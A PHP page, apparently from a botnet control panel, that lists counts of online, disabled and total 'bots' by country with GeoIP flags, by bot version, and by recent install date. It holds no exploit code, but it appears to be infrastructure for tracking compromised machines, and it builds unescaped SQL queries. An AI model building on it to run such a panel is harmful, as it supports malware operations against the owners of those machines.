<script type="text/javascript">
function getState(idc) {
	var b = document.getElementById('bfc' + idc);
	var tr = document.getElementById('tfc' + idc);
	var td = document.getElementById('fc' + idc);
	if (b && tr && td) {
		if (b.src.indexOf('info.png') == -1) {
			b.src = 'img/icos/info.png';
			td.innerHTML = '';
		}
		else {
			ajax_load('frm_botsmon_state.php?idc=' + idc, 'fc' + idc);
			b.src = 'img/icos/info-gray.png';
		}
	}
}
</script>

<?php

require_once 'mod_dbase.php';
require_once 'mod_bots.php';
require_once 'mod_file.php';
require_once 'bt_update_stuff.php';


$dbase = db_open();
if (!$dbase) exit;

echo "<h2><b>GEO info</b></h2>";

refresh_bot_info($dbase);

$res = mysqli_query($dbase, "SELECT * FROM country_t ORDER BY name_country");
$cnt = mysqli_num_rows($res);
if ($cnt > 0) {
	require_once 'geoip/geoip.inc';
	$gi = new GeoIP;
		  
	echo "<script type=\"text/javascript\" charset=\"ISO-8859-1\" src=\"js/alarm.js\"></script>";
	echo "<script type=\"text/javascript\" charset=\"ISO-8859-1\" src=\"js/list_stuff.js\"></script>";

	echo "<table width='740px' border='1' cellspacing='0' cellpadding='0' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'>";
	echo "<th>Flag</th>";
	echo "<th>Country</th>";
	echo "<th>Online Bots/<font class='disabled'>Disabled Bots</font> / All Bots</th>";
	echo "<th>Detail State</th>";
	for ($i = 0; $mres = mysqli_fetch_array($res); $i++) {
		$idc = $mres['id_country'];
		$res2 = mysqli_query($dbase, "SELECT count(id_bot) FROM bots_t WHERE (fk_city_bot IN (SELECT id_city FROM city_t, country_t WHERE fk_country_city = id_country AND id_country = " . $idc . ")) AND (status_bot <> 'offline')");
		$actb_cnt = -1;
		if ((@($res2)) && mysqli_num_rows($res2) > 0) {
			$mres2 = mysqli_fetch_array($res2);
			$actb_cnt = $mres2[0];
		}

		$res2 = mysqli_query($dbase, "SELECT count(id_bot) FROM bots_t WHERE fk_city_bot IN (SELECT id_city FROM city_t, country_t WHERE fk_country_city = id_country AND id_country = " . $idc . ")");
		$allb_cnt = -1;
		if ((@($res2)) && mysqli_num_rows($res2) > 0) {
			$mres2 = mysqli_fetch_array($res2);
			$allb_cnt = $mres2[0];

			/* if (!$allb_cnt) {
				mysqli_query($dbase, "DELETE FROM city_t WHERE fk_country_city = " . $idc . "");
				// ������� country_t ���� �������� ������, � �� ����� �������� ��������� ����
				//mysqli_query($dbase, "DELETE FROM country_t WHERE id_country = " . $idc . "");
				continue;
			} */
		}
	  
		$idc = $idc;
	  
		$icfg = parse_ini_file('config.ini');
		$wait_before_start = $icfg['WAIT_BEFORE_START'];
		if (strlen($wait_before_start) != 19) {
			$wait_before_start = '1970-04-01 00:00:00';
			writelog('error.log', 'Cannot read WAIT_BEFORE_START from config');
		}
			
	  	$sql = "SELECT count(distinct bots_t.id_bot)"
		     . " FROM bots_t, bots_rep_t, city_t"
			 . " WHERE bots_t.id_bot = bots_rep_t.fk_bot_rep"
			 . "   AND bots_t.fk_city_bot = city_t.id_city"
			 . "   AND city_t.fk_country_city = " . $idc
			 . "   AND status_bot <> 'offline'"
			 . "   AND ( bots_rep_t.data_rep like '%sloppy%'"
			 . "    OR UNIX_TIMESTAMP( date_last_run_bot ) >= ( UNIX_TIMESTAMP( now( ) ) - UNIX_TIMESTAMP('" . $wait_before_start . "') )"
			 . "    OR bots_t.blocked = 1"
			 . "	OR bots_t.ver_bot <> " . LAST_VERSION_BOT . " )";
		$res2 = mysqli_query($dbase, $sql);
		$disb_cnt = 0;
		if ((@($res2)) && mysqli_num_rows($res2) > 0) {
			$mres2 = mysqli_fetch_array($res2);
			$disb_cnt = $mres2[0];
		}

		$ccode = 'null';
        for ($j = 1; $j <= count($gi->GEOIP_COUNTRY_NAMES); $j++) {
			if (!strcmp($gi->GEOIP_COUNTRY_NAMES[$j], $mres['name_country'])) {
				$ccode = $gi->GEOIP_COUNTRY_CODES[$j];
				break;
			}
		}
		
		if (!$allb_cnt) continue;
		
		echo "<tr align='center' id=\"tid$i\">\n";
		echo "<td width='30px'><img border='0' src='img/flags/$ccode.gif'></td>\n";
		echo "<td width='200px'>" . $mres['name_country'] . "</td>\n";
		echo "<td><font style='font-size: 14px;'>($actb_cnt/<font class='disabled'>$disb_cnt</font> / $allb_cnt)</font></td>\n";
		echo "<td width='30px'><a href='#null' onclick='getState($idc); return false;'><img id='bfc$idc' src='img/icos/info.png' border='0'></a></td>\n";
		echo "</tr>\n";
		
		echo "<tr align='center' id='tfc$idc'>\n";
		echo "<td></td><td id='fc$idc' colspan='3'></td>";
		echo "</tr>\n";

		//if ($actb_cnt - $disb_cnt < 3 && $disb_cnt >= 3 ) {
		//	echo "<script type=\"text/javascript\">gAlrmElts.push(document.getElementById('tid$i'));</script>";
		//}
			  
	}
}
else {
	echo "<p>message>> ERROR IN SELECTION OF 'COUNTRY_T'";
	exit;
}

echo "</table>";

echo "<h2><b>Version info</b></h2>";

echo "<table width='240px' border='1' cellspacing='0' cellpadding='0' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'>";
echo "<th>Version</th>";
echo "<th>Count (online / all)</th>";
$res = mysqli_query($dbase, "SELECT distinct ver_bot FROM bots_t ORDER BY ver_bot DESC");
for ($i = 0; $mres = mysqli_fetch_array($res); $i++) {
	$ver_bot = $mres['ver_bot'];
	
	$res2 = mysqli_query($dbase, "SELECT count(*) FROM bots_t WHERE ver_bot = $ver_bot");
	if (!$res2 || !mysqli_num_rows($res)) continue;
	$mres2 = mysqli_fetch_array($res2); 
	$cnta = $mres2[0];
	
	$res2 = mysqli_query($dbase, "SELECT count(*) FROM bots_t WHERE ver_bot = $ver_bot AND status_bot = 'online'");
	if (!$res2 || !mysqli_num_rows($res)) continue;
	$mres2 = mysqli_fetch_array($res2); 
	$cnto = $mres2[0];
	
	if (!$i)
		echo "<tr align='center'><td>$ver_bot</td><td>$cnto / $cnta</td></tr>";
	else
		echo "<tr align='center'><td><font style='color: red;'>$ver_bot</font></td><td>$cnto / $cnta</td></tr>";
}
echo "</table>";

echo "<h2><b>Count of bots for last 5 days</b></h2>";

echo "<table width='240px' border='1' cellspacing='0' cellpadding='0' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'>";
echo "<th>Date</th>";
echo "<th>Count (online / all)</th>";
for ($i = -4; $i != 1; $i++) {
	$day1 = $i;
	if ($day1 < 0)
		$date1 = "$day1 day";
	else if ($day1 > 0)
		$date1 = "+$day1 day";
	else
		$date1 = "now";
	//echo "date1 = '$date1'<br>";
	$date1 = strtotime($date1);
	$date1 = gmdate('Y.m.d', $date1);
	//echo "date1 = '$date1'<br>";
	//
	$day2 = $i + 1;
	if ($day2 < 0)
		$date2 = "$day2 day";
	else if ($day2 > 0)
		$date2 = "+$day2 day";
	else
		$date2 = "now";
	//echo "date2 = '$date2'<br>";
	$date2 = strtotime($date2);
	$date2 = gmdate('Y.m.d', $date2);
	//echo "date2 = '$date2'<br>";
	
	$sql = "SELECT count(*) FROM bots_t WHERE date_install_bot >= '$date1' AND date_install_bot <= '$date2'";
	//echo "sql = '$sql'<br>";
	$res2 = mysqli_query($dbase, $sql);
	if (!$res2 || !mysqli_num_rows($res)) continue;
	$mres2 = mysqli_fetch_array($res2); 
	$cnta = $mres2[0];
	
	$sql = "SELECT count(*) FROM bots_t WHERE date_install_bot >= '$date1' AND date_install_bot <= '$date2' AND status_bot = 'online'";
	//echo "sql = '$sql'<br>";
	$res2 = mysqli_query($dbase, $sql);
	if (!$res2 || !mysqli_num_rows($res)) continue;
	$mres2 = mysqli_fetch_array($res2); 
	$cnto = $mres2[0];
	
	echo "<tr align='center'><td>$date1</td><td>$cnto / $cnta</td></tr>";
}
echo "</table>";


db_close($dbase);

?>